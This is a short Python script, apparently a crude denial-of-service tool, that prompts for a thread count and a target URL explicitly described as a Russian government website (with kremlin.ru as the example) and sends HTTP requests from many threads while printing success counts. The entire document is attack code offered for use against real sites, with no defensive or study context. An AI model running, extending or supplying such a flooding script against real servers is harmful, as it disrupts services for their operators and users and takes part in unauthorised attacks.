import requests
import threading
from colorama import init, Fore
workers = int(input("How much workers? (Please put a number): "))
url = input("Please put the russian gov you want to DoS (for ex 'https://kremlin.ru'): ")
init()
def asd():
    global count
    try:
        requests.get(url)
        count += 1
        print(Fore.GREEN + "[" + str(count) + "]" + " Success!")
    except:
        print(Fore.RED + "Error! The website is down, or either you misspelled the URL!")
count = 0
for i in range(workers):
    threading.Thread(target=asd).start()
